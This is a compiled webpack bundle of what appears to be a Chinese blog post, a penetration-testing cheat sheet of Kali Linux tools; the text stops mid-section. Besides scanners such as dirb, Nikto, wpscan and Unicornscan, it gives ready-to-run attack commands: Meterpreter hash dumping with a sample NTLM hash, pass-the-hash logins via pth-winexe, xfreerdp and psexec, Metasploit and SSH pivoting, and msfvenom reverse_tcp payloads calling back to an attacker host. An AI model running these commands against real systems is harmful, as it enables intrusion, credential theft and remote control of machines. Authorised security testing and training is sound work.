(window.webpackJsonp=window.webpackJsonp||[]).push([[90],{473:function(s,a,t){"use strict";t.r(a);var e=t(2),r=Object(e.a)({},(function(){var s=this,a=s.$createElement,t=s._self._c||a;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("div",{staticClass:"custom-block tip"},[t("p",{staticClass:"custom-block-title"},[s._v("前言")]),s._v(" "),t("p",[s._v("总结在渗透测试上的一些小技巧, 基本上都是 kali 下的一些常用的工具使用集合")])]),s._v(" "),t("h2",{attrs:{id:"dirb"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#dirb"}},[s._v("#")]),s._v(" DIRB")]),s._v(" "),t("h3",{attrs:{id:"使用-dirb-爆破目录"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#使用-dirb-爆破目录"}},[s._v("#")]),s._v(" 使用 DIRB 爆破目录")]),s._v(" "),t("p",[s._v("注: "),t("a",{attrs:{href:"http://dirb.sourceforge.net/",target:"_blank",rel:"noopener noreferrer"}},[s._v("DIRB"),t("OutboundLink")],1),s._v(" 是一个专门用于爆破目录的工具, 在 Kali 中默认已经安装, 类似工具还有国外的 "),t("a",{attrs:{href:"http://github.com/lanjelot/patator",target:"_blank",rel:"noopener noreferrer"}},[s._v("patator"),t("OutboundLink")],1),s._v(", "),t("a",{attrs:{href:"http://github.com/maurosoria/dirsearch",target:"_blank",rel:"noopener noreferrer"}},[s._v("dirsearch"),t("OutboundLink")],1),s._v(", [DirBuster](http://www.owasp.org/index.php/Category: OWASP_DirBuster_Project), 国内的御剑等等。")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("dirb http://"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("IP"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(":PORT /usr/share/dirb/wordlists/common.txt\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h2",{attrs:{id:"niko"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#niko"}},[s._v("#")]),s._v(" Niko")]),s._v(" "),t("h3",{attrs:{id:"使用-nikto-扫描-web-服务"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#使用-nikto-扫描-web-服务"}},[s._v("#")]),s._v(" 使用 Nikto 扫描 Web 服务")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("nikto -C all -h http://"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("IP"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h2",{attrs:{id:"wpscan"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#wpscan"}},[s._v("#")]),s._v(" wpscan")]),s._v(" "),t("h3",{attrs:{id:"使用-wpscan-扫描-wordpress"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#使用-wpscan-扫描-wordpress"}},[s._v("#")]),s._v(" 使用 wpscan 扫描 WordPress")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("git")]),s._v(" clone https://github.com/wpscanteam/wpscan.git "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" wpscan\n./wpscan –url "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("http:http://"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("IP"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("/"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" –enumerate p\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("h2",{attrs:{id:"httprint"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#httprint"}},[s._v("#")]),s._v(" httprint")]),s._v(" "),t("h3",{attrs:{id:"使用-httprint-进行-http-指纹识别"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#使用-httprint-进行-http-指纹识别"}},[s._v("#")]),s._v(" 使用 httprint 进行 HTTP 指纹识别")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("wget")]),s._v(" //www.net-square.com/_assets/httprint_linux_301.zip "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("unzip")]),s._v(" httprint_linux_301.zip\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" httprint_301/linux/\n./httprint -h http://"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("IP"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" -s signatures.txt\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("h2",{attrs:{id:"skipfish"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#skipfish"}},[s._v("#")]),s._v(" Skipfish")]),s._v(" "),t("h3",{attrs:{id:"使用-skipfish-进行-web-应用安全"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#使用-skipfish-进行-web-应用安全"}},[s._v("#")]),s._v(" 使用 Skipfish 进行 Web 应用安全")]),s._v(" "),t("p",[s._v("注: Skipfish 是一款 Web 应用安全侦查工具, Skipfish 会利用递归爬虫和基于字典的探针生成一幅交互式网站地图, 最终生成的地图会在通过安全检查后输出。")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("skipfish -m "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("5")]),s._v(" -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("IP"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h2",{attrs:{id:"nc"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#nc"}},[s._v("#")]),s._v(" nc")]),s._v(" "),t("h3",{attrs:{id:"使用-nc-进行扫描"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#使用-nc-进行扫描"}},[s._v("#")]),s._v(" 使用 nc 进行扫描")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" -v -w "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" target -z "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("-1000\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token for-or-select variable"}},[s._v("i")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("101")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("102")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("do")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" -vv -n -w "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".56."),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$i")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("21")]),s._v("-25 -z"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("done")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("h2",{attrs:{id:"us"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#us"}},[s._v("#")]),s._v(" us")]),s._v(" "),t("h3",{attrs:{id:"使用-unicornscan-进行信息收集和安全审计"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#使用-unicornscan-进行信息收集和安全审计"}},[s._v("#")]),s._v(" 使用 Unicornscan 进行信息收集和安全审计")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("us -H -msf -Iv "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".56.101 -p "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("-65535\nus -H -mU -Iv "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".56.101 -p "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("-65535\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# -H 在生成报告阶段解析主机名")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# -m 扫描类型 (sf - tcp, U - udp)")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# -Iv - 详细")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br")])]),t("h2",{attrs:{id:"xprobe2"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#xprobe2"}},[s._v("#")]),s._v(" Xprobe2")]),s._v(" "),t("h3",{attrs:{id:"使用-xprobe2-识别操作系统指纹"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#使用-xprobe2-识别操作系统指纹"}},[s._v("#")]),s._v(" 使用 Xprobe2 识别操作系统指纹")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("xprobe2 -v -p tcp:80:open IP\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h2",{attrs:{id:"meterpreter"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#meterpreter"}},[s._v("#")]),s._v(" Meterpreter")]),s._v(" "),t("h3",{attrs:{id:"使用-meterpreter-进行端口转发"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#使用-meterpreter-进行端口转发"}},[s._v("#")]),s._v(" 使用 Meterpreter 进行端口转发")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# //www.offensive-security.com/metasploit-unleashed/portfwd/")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 转发远程端口到目标地址")]),s._v("\n\nmeterpreter "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" portfwd "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("add")]),s._v(" –l "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("3389")]),s._v(" –p "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("3389")]),s._v(" –r "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("172.16")]),s._v(".194.141\nkali "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" rdesktop "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1:3389\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br")])]),t("h3",{attrs:{id:"使用-meterpreter-获取哈希值"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#使用-meterpreter-获取哈希值"}},[s._v("#")]),s._v(" 使用 Meterpreter 获取哈希值")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("git")]),s._v(" clone https://github.com/byt3bl33d3r/pth-toolkit\npth-winexe -U "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("hash")]),s._v(" http://"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("IP"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" cmd\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 或者")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("apt-get")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("install")]),s._v(" freerdp-x11\nxfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 在或者")]),s._v("\n\nmeterpreter "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" run post/windows/gather/hashdump\nAdministrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::\nmsf "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" use exploit/windows/smb/psexec\nmsf exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("psexec"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" payload windows/meterpreter/reverse_tcp\nmsf exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("psexec"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c\nmsf exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("psexec"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" exploit\nmeterpreter "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" shell\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br")])]),t("h4",{attrs:{id:"使用-hashcat-破解密码"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#使用-hashcat-破解密码"}},[s._v("#")]),s._v(" 使用 Hashcat 破解密码")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("hashcat -m "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("400")]),s._v(" -a "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("hash")]),s._v(" /root/rockyou.txt\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h3",{attrs:{id:"使用-metasploit-进行穿透"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#使用-metasploit-进行穿透"}},[s._v("#")]),s._v(" 使用 metasploit 进行穿透")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("route "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("add")]),s._v(" X.X.X.X "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("255.255")]),s._v(".255.0 "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\nuse auxiliary/server/socks4a\nrun\nproxychains msfcli windows/* "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("PAYLOAD")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("windows/meterpreter/reverse_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("IP "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("443")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("RHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("IP E\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#或者")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# //www.offensive-security.com/metasploit-unleashed/pivoting/")]),s._v("\nmeterpreter "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" ipconfig\nIP Address  "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.1")]),s._v(".13.3\nmeterpreter "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" run autoroute -s "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.1")]),s._v(".13.0/24\nmeterpreter "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" run autoroute -p\n"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.1")]),s._v(".13.0          "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("255.255")]),s._v(".255.0      Session "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\nmeterpreter "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" Ctrl+Z\nmsf auxiliary"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("tcp"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" use exploit/windows/smb/psexec\nmsf exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("psexec"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" RHOST "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.1")]),s._v(".13.2\nmsf exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("psexec"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" exploit\nmeterpreter "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" ipconfig\nIP Address  "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.1")]),s._v(".13.2\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br")])]),t("h2",{attrs:{id:"ssh"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#ssh"}},[s._v("#")]),s._v(" ssh")]),s._v(" "),t("h3",{attrs:{id:"ssh-穿透"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#ssh-穿透"}},[s._v("#")]),s._v(" SSH 穿透")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" -D "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1:1080 -p "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v(" user@IP\nAdd socks4 "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1 "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1080")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" /etc/proxychains.conf\nproxychains commands target\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("h3",{attrs:{id:"ssh-穿透从一个网络到另一个网络"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#ssh-穿透从一个网络到另一个网络"}},[s._v("#")]),s._v(" SSH 穿透从一个网络到另一个网络")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" -D "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1:1080 -p "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v(" user1@IP1\nAdd socks4 "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1 "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1080")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" /etc/proxychains.conf\nproxychains "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" -D "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1:1081 -p "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v(" user1@IP2\nAdd socks4 "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1 "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1081")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" /etc/proxychains.conf\nproxychains commands target\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br")])]),t("h2",{attrs:{id:"msfvenom"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#msfvenom"}},[s._v("#")]),s._v(" msfvenom")]),s._v(" "),t("h3",{attrs:{id:"msf-payloads"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#msf-payloads"}},[s._v("#")]),s._v(" MSF Payloads")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("msfvenom -p windows/meterpreter/reverse_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("IP Address"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" X "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" system.exe\nmsfvenom -p php/meterpreter/reverse_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("IP Address"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("443")]),s._v(" R "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" exploit.php\nmsfvenom -p windows/meterpreter/reverse_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("IP Address"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("443")]),s._v(" -e -a x86 --platform win -f asp -o file.asp\nmsfvenom -p windows/meterpreter/reverse_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("IP Address"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("443")]),s._v(" -e x86/shikata_ga_nai -b "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),t("span",{pre:!0,attrs:{class:"token entity",title:"\\x00"}},[s._v("\\x00")]),s._v('"')]),s._v(" -a x86 --platform win -f c\n")])]),s._v(" 